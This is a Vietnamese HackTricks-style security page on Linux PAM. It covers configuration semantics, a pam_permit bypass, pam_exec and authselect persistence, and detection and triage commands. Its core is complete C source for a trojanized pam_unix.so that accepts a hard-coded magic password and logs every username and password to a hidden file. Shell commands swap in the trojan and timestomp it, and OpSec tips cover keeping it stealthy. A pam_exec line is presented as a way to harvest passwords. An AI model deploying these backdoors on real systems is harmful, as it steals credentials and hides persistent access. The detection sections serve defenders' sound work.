# PAM - Pluggable Authentication Modules

{{#include ../../banners/hacktricks-training.md}}

### Thông tin cơ bản

**PAM (Pluggable Authentication Modules)** là một cơ chế bảo mật **xác minh danh tính của người dùng đang cố gắng truy cập các dịch vụ máy tính**, kiểm soát quyền truy cập của họ dựa trên nhiều tiêu chí. Cơ chế này giống như một người gác cổng kỹ thuật số, đảm bảo chỉ người dùng được ủy quyền mới có thể sử dụng các dịch vụ cụ thể, đồng thời có thể giới hạn mức sử dụng để tránh hệ thống bị quá tải.

#### Tệp cấu hình

- **Solaris** hỗ trợ tệp trung tâm cũ `/etc/pam.conf`, nhưng hướng dẫn hiện nay khuyến nghị sử dụng các tệp dịch vụ trong `/etc/pam.d`.<sup>[[10]](#references)</sup>
- **Các hệ thống Linux** ưu tiên cách tổ chức theo thư mục, lưu cấu hình riêng cho từng dịch vụ trong `/etc/pam.d`. Ví dụ, tệp cấu hình cho dịch vụ đăng nhập nằm tại `/etc/pam.d/login`.<sup>[[1]](#references)</sup>

Ví dụ về cấu hình PAM cho dịch vụ đăng nhập có thể như sau:

```
auth required /lib/security/pam_securetty.so
auth required /lib/security/pam_nologin.so
auth sufficient /lib/security/pam_ldap.so
auth required /lib/security/pam_unix_auth.so try_first_pass
account sufficient /lib/security/pam_ldap.so
account required /lib/security/pam_unix_acct.so
password required /lib/security/pam_cracklib.so
password required /lib/security/pam_ldap.so
password required /lib/security/pam_pwdb.so use_first_pass
session required /lib/security/pam_unix_session.so
```

#### **Các realm quản lý PAM**

Các realm, hay nhóm quản lý này, gồm **auth**, **account**, **password** và **session**; mỗi nhóm chịu trách nhiệm cho một khía cạnh khác nhau của quy trình xác thực và quản lý phiên:<sup>[[1]](#references)</sup>

- **Auth**: Xác thực danh tính người dùng, thường bằng cách yêu cầu nhập mật khẩu.
- **Account**: Xử lý việc xác minh tài khoản, kiểm tra các điều kiện như tư cách thành viên nhóm hoặc giới hạn thời gian trong ngày.
- **Password**: Quản lý việc cập nhật mật khẩu, bao gồm kiểm tra độ phức tạp hoặc ngăn chặn tấn công từ điển.
- **Session**: Quản lý các hành động khi bắt đầu hoặc kết thúc phiên dịch vụ, chẳng hạn như mount thư mục hoặc thiết lập giới hạn tài nguyên.

#### **Các control của module PAM**

Các control quy định phản hồi của module khi thành công hoặc thất bại, ảnh hưởng đến toàn bộ quy trình xác thực. Các control gồm:<sup>[[1]](#references)</sup>

- **Required**: Module `required` thất bại sẽ dẫn đến thất bại cuối cùng, nhưng chỉ sau khi kiểm tra tất cả module tiếp theo.
- **Requisite**: Quy trình chấm dứt ngay khi xảy ra lỗi.
- **Sufficient**: Nếu không có module `required` nào trước đó thất bại, khi thành công thì trả về ngay và bỏ qua các module còn lại trong cùng nhóm quản lý.
- **Optional**: Chỉ gây thất bại nếu đây là module duy nhất trong stack.

#### Các ngữ nghĩa tấn công quan trọng

Khi phân tích hoặc sửa đổi PAM, **vị trí của quy tắc được chèn** quyết định stack nào áp dụng quy tắc đó:<sup>[[1]](#references)[[13]](#references)</sup>

- `include` và `substack` lấy các quy tắc từ tệp khác, vì vậy sửa `sshd` có thể chỉ ảnh hưởng đến SSH, trong khi sửa `system-auth`, `common-auth` hoặc một stack dùng chung khác có thể ảnh hưởng đến nhiều dịch vụ cùng lúc.<sup>[[1]](#references)[[13]](#references)</sup>
- PAM cũng hỗ trợ các control đặt trong ngoặc vuông như `[success=1 default=ignore]`. Có thể lạm dụng chúng để **bỏ qua một hoặc nhiều module** sau khi một kiểm tra tùy chỉnh thành công, thay vì thay thế `pam_unix.so` một cách dễ thấy.<sup>[[1]](#references)</sup>
- `module-path` có thể là đường dẫn **tuyệt đối** (`/usr/lib/security/pam_custom.so`) hoặc đường dẫn **tương đối** với thư mục module PAM mặc định. Trên các hệ thống Linux hiện đại, thư mục thực tế thường là `/lib/security`, `/lib64/security`, `/usr/lib/security` hoặc các đường dẫn multiarch như `/usr/lib/x86_64-linux-gnu/security`.<sup>[[1]](#references)[[14]](#references)</sup>

Điểm cần nhớ nhanh cho operator: luôn lập sơ đồ **đầy đủ các luồng dịch vụ** trước khi vá. Ví dụ, `sshd -> password-auth -> system-auth` trên một số distro hoặc `sshd -> system-remote-login -> system-login -> system-auth` trên các distro khác có nghĩa là cùng một implant chỉ gồm một dòng có thể lan rộng hơn nhiều so với dự định.<sup>[[1]](#references)[[13]](#references)</sup>

Một module `auth` tùy chỉnh có thể thêm bước challenge tương tác vào `sudo` sau mật khẩu tài khoản. Trước khi xem xét challenge theo cách thủ công, hãy kiểm tra stack `/etc/pam.d/sudo` thực tế, chính sách được include, tham số module và quyền đối với mọi tệp dữ liệu cục bộ được tham chiếu. Chỉ riêng danh sách từ challenge có thể đọc được không thể bỏ qua bước kiểm tra mật khẩu hoặc tạo quyền sudoers. Việc chuyển sang quyền cao hơn vẫn đòi hỏi xác thực tài khoản chính xác, hoàn tất mọi bước PAM bắt buộc và có quy tắc sudo cho phép chạy với quyền root; không để quá trình enumeration không tương tác kích hoạt challenge.

Đối với lỗi quyền sở hữu cũ của Ubuntu trong [`pam_motd` (CVE-2010-0832)](https://ubuntu.com/security/cve-2010-0832), hãy kiểm tra bản build `libpam-modules` thực tế và liệu dịch vụ đăng nhập có gọi module session bị ảnh hưởng hay không. Ubuntu đã sửa lỗi trong **1.1.0-2ubuntu1.1** cho 9.10 và **1.1.1-2ubuntu5** cho 10.04 LTS; các bản phát hành khác hoặc bản backport của nhà cung cấp cần được đánh giá gói riêng. Theo báo cáo, đường khai thác yêu cầu người gọi thay `.cache` trong home của họ bằng một symlink rồi kích hoạt đăng nhập PAM, khiến module cũ thay đổi quyền sở hữu của một mục tiêu được bảo vệ. Chỉ riêng một mục `.cache`, dòng `pam_motd.so` hoặc phiên bản kernel cũ không đủ để xác định hệ thống bị ảnh hưởng; hãy kiểm tra quyền kiểm soát thư mục home, phiên bản module thực tế, khả năng tiếp cận luồng đăng nhập, cách xử lý symlink và quyền của mục tiêu, mà không thay thế tệp hoặc bắt đầu phiên đăng nhập trong quá trình enumeration thụ động. Xem [thông báo bảo mật của Ubuntu](https://ubuntu.com/security/notices/USN-959-1).

#### Kịch bản ví dụ

Trong một cấu hình có nhiều module auth, quy trình tuân theo một thứ tự nghiêm ngặt. Nếu module `pam_securetty` xác định terminal đăng nhập không được phép, các lần đăng nhập root sẽ bị chặn, nhưng tất cả module vẫn được xử lý do trạng thái "required" của nó. `pam_env` thiết lập các biến môi trường, có thể giúp cải thiện trải nghiệm người dùng. Các module `pam_ldap` và `pam_unix` phối hợp để xác thực người dùng; `pam_unix` thử dùng mật khẩu đã được cung cấp trước đó, giúp tăng hiệu quả và tính linh hoạt của các phương thức xác thực.<sup>[[1]](#references)[[13]](#references)[[15]](#references)[[16]](#references)[[17]](#references)</sup>


## `pam_permit` trong stack dịch vụ

`pam_permit.so` trả về thành công cho các bước kiểm tra PAM. Nếu người dùng có quyền thấp hơn có thể sửa chính sách PAM thực tế của một dịch vụ, việc chèn module này cùng một control flag khiến stack xác thực short-circuit có thể loại bỏ bước kiểm tra mật khẩu của dịch vụ đó. Với `sudo`, hãy kiểm tra `/etc/pam.d/sudo` và mọi tệp `common-auth` hoặc `system-auth` được include trước khi xác định những dịch vụ nào bị ảnh hưởng. Bypass xác thực PAM **không** cấp thêm quy tắc sudoers; người dùng vẫn phải được cho phép chạy lệnh được yêu cầu. Hãy kiểm tra thứ tự quy tắc và mọi lỗi `required` xảy ra trước đó, thay vì cho rằng chỉ một dòng `sufficient pam_permit.so` luôn đảm bảo thành công.

## Backdooring PAM – Hooking `pam_unix.so`

Một thủ thuật persistence kinh điển trong các môi trường Linux có giá trị cao là **thay thư viện PAM hợp pháp bằng một drop-in đã được trojan hóa**. Trên máy chủ có stack PAM tải `pam_unix.so`, xác thực SSH hoặc console có thể gọi entry point `pam_sm_authenticate()` của module này; một bản thay thế độc hại có thể thu thập thông tin xác thực hoặc triển khai cơ chế bypass bằng mật khẩu *magic*.<sup>[[2]](#references)[[11]](#references)</sup>

### Cheatsheet biên dịch
Phác thảo bên dưới sử dụng service entry point `pam_sm_authenticate()` của Linux-PAM và `pam_get_authtok()` để truy cập token xác thực.<sup>[[11]](#references)[[12]](#references)</sup>
<details>
<summary>Mẫu trojan `pam_unix.so`</summary>

```c
#define _GNU_SOURCE
#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <dlfcn.h>
#include <stdio.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>

static void *real_module;
static int (*orig_auth)(pam_handle_t *, int, int, const char **);
static int (*orig_setcred)(pam_handle_t *, int, int, const char **);
static const char *MAGIC = "Sup3rS3cret!";

static int load_original(void) {
    if (real_module) return 0;
    real_module = dlopen("/lib/security/pam_unix.so.bak", RTLD_NOW | RTLD_LOCAL);
    if (!real_module) return -1;
    orig_auth = dlsym(real_module, "pam_sm_authenticate");
    orig_setcred = dlsym(real_module, "pam_sm_setcred");
    return (orig_auth && orig_setcred) ? 0 : -1;
}

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    const char *user = NULL, *pass = NULL;
    pam_get_user(pamh, &user, NULL);
    pam_get_authtok(pamh, PAM_AUTHTOK, &pass, NULL);

    /* Magic pwd → immediate success */
    if(pass && strcmp(pass, MAGIC) == 0) return PAM_SUCCESS;

    /* Credential harvesting */
    if (user && pass) {
        int fd = open("/usr/bin/.dbus.log", O_WRONLY|O_APPEND|O_CREAT, 0600);
        if (fd >= 0) {
            dprintf(fd, "%s:%s\n", user, pass);
            close(fd);
        }
    }

    /* Forward to the renamed original module. */
    if (load_original() != 0) return PAM_SYSTEM_ERR;
    return orig_auth(pamh, flags, argc, argv);
}

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    if (load_original() != 0) return PAM_SYSTEM_ERR;
    return orig_setcred(pamh, flags, argc, argv);
}
```

</details>

Biên dịch và stealth-replace (mẫu thay thế/timestomp được Unit 42 ghi lại). Điều chỉnh cả đường dẫn sao lưu được hard-code trong wrapper lẫn các lệnh bên dưới để khớp với thư mục PAM module thực tế của mục tiêu:<sup>[[2]](#references)</sup>
```bash
gcc -fPIC -shared -o pam_unix.so trojan_pam.c -ldl -lpam
mv /lib/security/pam_unix.so /lib/security/pam_unix.so.bak
mv pam_unix.so /lib/security/pam_unix.so
chmod 644 /lib/security/pam_unix.so     # keep original perms
touch -r /bin/ls /lib/security/pam_unix.so  # timestomp
```

### Mẹo OpSec
1. **Atomic overwrite** – ghi toàn bộ thư viện vào một tệp tạm rồi đổi tên tệp vào vị trí cần thiết để tránh để lại một module xác thực được ghi dở.
2. Một đường dẫn như `/usr/bin/.dbus.log` đã được ghi nhận trong phân tích AuthDoor của Unit 42, vì vậy đây cũng là một chỉ dấu hữu ích để truy tìm.<sup>[[2]](#references)</sup>
3. Giữ lại các entry point mà PAM stack mong đợi (ví dụ: `pam_sm_authenticate` và `pam_sm_setcred`) để các thao tác quản lý khác tiếp tục hoạt động.<sup>[[11]](#references)[[18]](#references)</sup>

### Phát hiện
Để kiểm tra tính toàn vẹn của package, RPM xác minh metadata của tệp đã cài đặt, `debsums -s` báo lỗi checksum, còn `dpkg -S` trong khối triage truy vấn quyền sở hữu package; cú pháp audit watch ghi lại các lần ghi và thay đổi thuộc tính trên một đường dẫn.<sup>[[6]](#references)[[7]](#references)[[8]](#references)[[9]](#references)</sup>
* So sánh MD5/SHA256 của `pam_unix.so` với package của distro.
* Chạy `rpm -V pam` hoặc `debsums -s libpam-modules` để phát hiện thư viện bị thay thế mà không cần tự tính hash.
* Kiểm tra các quyền ghi cho mọi người dùng hoặc quyền sở hữu bất thường bên dưới `/lib/security/`.
* Quy tắc `auditd`: `-w /lib/security/pam_unix.so -p wa -k pam-backdoor`.
* Grep các cấu hình PAM để tìm module không mong đợi: `grep -R "pam_[a-z].*\.so" /etc/pam.d/ | grep -v pam_unix`.

Lệnh grep `pam_` này bỏ sót các module tùy chỉnh có basename `.so` khác. Kiểm tra các dòng `auth`, `account`, `password` và `session` đang **hoạt động** trong `/etc/pam.d` (và `/etc/pam.conf` nếu được dùng), bao gồm control flag và mọi stack được include. Một module lạ được đặt làm `auth sufficient` trước bước kiểm tra mật khẩu thông thường cần được kiểm tra quyền sở hữu package và binary; [cú pháp control của PAM](https://man7.org/linux/man-pages/man5/pam.d.5.html) có thể khiến thành công kết thúc sớm phần đó của stack. Chỉ riêng tên module, timestamp bất thường hoặc tùy chọn `nodelay` không chứng minh được có bypass. Nếu hành vi cho thấy có timing leak, trước tiên hãy kiểm tra cách triển khai và khả năng truy cập của service; hoạt động liệt kê thông thường không nên liên tục gửi các phỏng đoán thông tin xác thực.

### Lệnh triage nhanh (sau khi bị xâm nhập hoặc khi truy tìm mối đe dọa)
```bash
# 1) Spot alien PAM objects
find /{lib,usr/lib,usr/local/lib}{,64}/security -type f -printf '%p %s %M %u:%g %TY-%Tm-%Td\n' | grep -E 'pam_|libselinux'

# 2) Verify package integrity
command -v rpm >/dev/null && rpm -V pam || debsums -s libpam-modules

# 3) Identify non-packaged PAM modules
for f in /{lib,usr/lib,usr/local/lib}{,64}/security/*.so; do
    dpkg -S "$f" >/dev/null 2>&1 || echo "UNPACKAGED: $f";
done

# 4) Look for stealth config edits
grep -R "pam_.*\.so" /etc/pam.d/ | grep -E 'plg|selinux|custom|exec'
```

### Lạm dụng `pam_exec` để duy trì quyền truy cập
Thay vì thay thế `pam_unix.so`, một cách ít can thiệp hơn là thêm một dòng `pam_exec` vào `/etc/pam.d/sshd` để một lần gọi đi đến dòng PAM đó sẽ chạy một helper, trong khi vẫn giữ nguyên stack thông thường.<sup>[[4]](#references)</sup>
```bash
# Run during the auth phase; expose_authtok sends the token on stdin
auth optional pam_exec.so quiet expose_authtok /usr/local/bin/.ssh_hook.sh
```
`pam_exec` nhận metadata PAM trong các biến môi trường như `PAM_USER`, `PAM_RHOST`, `PAM_SERVICE`, `PAM_TTY` và `PAM_TYPE`. Với `expose_authtok`, helper có thể đọc tối đa `PAM_MAX_RESP_SIZE` byte của mật khẩu từ `stdin` trong các giai đoạn `auth` hoặc `password`. Nếu muốn helper chạy với effective UID thay vì real UID, hãy thêm `seteuid`.<sup>[[4]](#references)</sup>

Các lưu ý thực tế dưới đây tuân theo các loại module và bộ lọc `type=` được ghi lại cho `pam_exec`:<sup>[[4]](#references)</sup>

- `session optional pam_exec.so ...` phù hợp hơn cho **các hành động sau đăng nhập**, chẳng hạn mở lại socket hoặc khởi chạy daemon chạy tách biệt.
- `auth optional pam_exec.so quiet expose_authtok ...` thường được chọn để **thu thập thông tin xác thực** vì nó chạy trước khi session mở.
- Có thể dùng `type=session` hoặc `type=auth` để giới hạn việc thực thi vào một giai đoạn PAM cụ thể và tránh chạy hai lần không cần thiết.

Khi rà soát đặc quyền, một đường dẫn tuyệt đối tới helper `pam_exec.so` mà người dùng hiện tại có thể ghi là một ứng viên cần kiểm tra, ngay cả khi tệp được đánh dấu append-only (`a`): [thuộc tính này cho phép ghi nối thêm](https://man7.org/linux/man-pages/man1/chattr.1.html), có thể đủ để thay đổi hành vi về sau của shell script. Trước tiên, hãy xác nhận rằng dịch vụ PAM và sự kiện thực sự đi tới dòng đó, helper cùng đường dẫn thư mục cha là đáng tin cậy, và lệnh chạy dưới một danh tính có đặc quyền cao hơn; [`seteuid` thay đổi PAM UID được sử dụng](https://man7.org/linux/man-pages/man8/pam_exec.8.html). Chỉ riêng tệp có quyền ghi hoặc kết quả `lsattr` không chứng minh được rằng lệnh chạy với đặc quyền cao.

### Duy trì thay đổi qua công cụ của distro: `authselect`

Trên các hệ thống thuộc họ RHEL và Fedora sử dụng `authselect`, các chỉnh sửa trực tiếp vào những tệp được tạo như `/etc/pam.d/system-auth` hoặc `/etc/pam.d/password-auth` có thể bị **`authselect` ghi đè**. Để duy trì thay đổi, quản trị viên thường sửa profile tùy chỉnh đang hoạt động trong `/etc/authselect/custom/<profile>/`, rồi chọn lại profile đó.<sup>[[5]](#references)[[19]](#references)</sup>

Quy trình thường dùng khi bạn có quyền root:<sup>[[5]](#references)</sup>

```bash
# Inspect the active profile first
authselect current

# If a custom profile already exists, edit its PAM templates instead of system-auth directly
find /etc/authselect/custom -maxdepth 2 -type f \( -name 'system-auth' -o -name 'password-auth' \) -ls

# Regenerate the PAM files after modifying the active custom profile
authselect apply-changes
```

Điều này quan trọng cả với offense lẫn triage: nếu `/etc/pam.d/system-auth` chứa banner `Generated by authselect` và `Do not modify this file manually`, thì điểm persistence thực sự có thể nằm trong `/etc/authselect/custom/` thay vì `/etc/pam.d/`.<sup>[[5]](#references)</sup>

### Tradecraft gần đây được ghi nhận ngoài thực tế

Các báo cáo gần đây năm 2025 về backdoor Linux **Plague** cho thấy cùng ý tưởng cốt lõi được phát triển thêm: một thành phần PAM độc hại với **mật khẩu bypass tĩnh**, cùng với việc dọn các biến môi trường liên quan đến SSH và lịch sử shell (`HISTFILE=/dev/null`) nhằm giảm dấu vết phiên sau khi đăng nhập.<sup>[[3]](#references)</sup> Đây là một mẫu hữu ích để săn tìm, vì logic của backdoor có thể nằm trong PAM, trong khi các artifact ẩn chỉ xuất hiện **sau khi** xác thực thành công.


## References

- [1] [pam.conf(5) / pam.d(5) - Tài liệu Linux-PAM](https://man7.org/linux/man-pages/man5/pam.d.5.html)
- [2] [Sổ tay của Covert Operator: Xâm nhập các mạng viễn thông toàn cầu - Unit 42](https://unit42.paloaltonetworks.com/infiltration-of-global-telecom-networks/)
- [3] [Nextron Systems - Plague: Backdoor dựa trên PAM mới được phát hiện dành cho Linux](https://www.nextron-systems.com/2025/08/01/plague-a-newly-discovered-pam-based-backdoor-for-linux/)
- [4] [pam_exec(8) - Tài liệu Linux-PAM](https://man7.org/linux/man-pages/man8/pam_exec.8.html)
- [5] [Cấu hình xác thực người dùng bằng authselect - Red Hat Enterprise Linux](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/10/html/configuring_authentication_and_authorization_in_rhel/configuring-user-authentication-using-authselect)
- [6] [rpm(8) - RPM](https://rpm.org/docs/4.20.x/man/rpm.8)
- [7] [debsums(1) - Trang hướng dẫn Debian](https://manpages.debian.org/unstable/debsums/debsums.1.en.html)
- [8] [auditctl(8) - Trang hướng dẫn Linux](https://man7.org/linux/man-pages/man8/auditctl.8.html)
- [9] [dpkg-query(1) - Trang hướng dẫn Debian](https://manpages.debian.org/testing/dpkg/dpkg-query.1.en.html)
- [10] [Quản lý xác thực trong Oracle Solaris 11.4](https://docs.oracle.com/cd/E37838_01/pdf/E67470.pdf)
- [11] [pam_sm_authenticate(3) - Tài liệu Linux-PAM](https://man7.org/linux/man-pages/man3/pam_sm_authenticate.3.html)
- [12] [pam_get_authtok(3) - Tài liệu Linux-PAM](https://man7.org/linux/man-pages/man3/pam_get_authtok.3.html)
- [13] [Hướng dẫn xác thực cấp hệ thống - Red Hat Enterprise Linux 7](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html-single/system-level_authentication_guide/index)
- [14] [Danh sách tệp gói Ubuntu: libpam-modules/noble/amd64](https://packages.ubuntu.com/noble/amd64/libpam-modules/filelist)
- [15] [pam_env(8) - Tài liệu Linux-PAM](https://man7.org/linux/man-pages/man8/pam_env.8.html)
- [16] [pam_unix(8) - Tài liệu Linux-PAM](https://man7.org/linux/man-pages/man8/pam_unix.8.html)
- [17] [pam_ldap(5) - Trang hướng dẫn Debian](https://manpages.debian.org/testing/libpam-ldap/pam_ldap.5.en.html)
- [18] [pam_sm_setcred(3) - Tài liệu Linux-PAM](https://man7.org/linux/man-pages/man3/pam_sm_setcred.3.html)
- [19] [Thay đổi/Coi Authselect là bắt buộc - Wiki Dự án Fedora](https://fedoraproject.org/wiki/Changes/Make_Authselect_Mandatory)
{{#include ../../banners/hacktricks-training.md}}
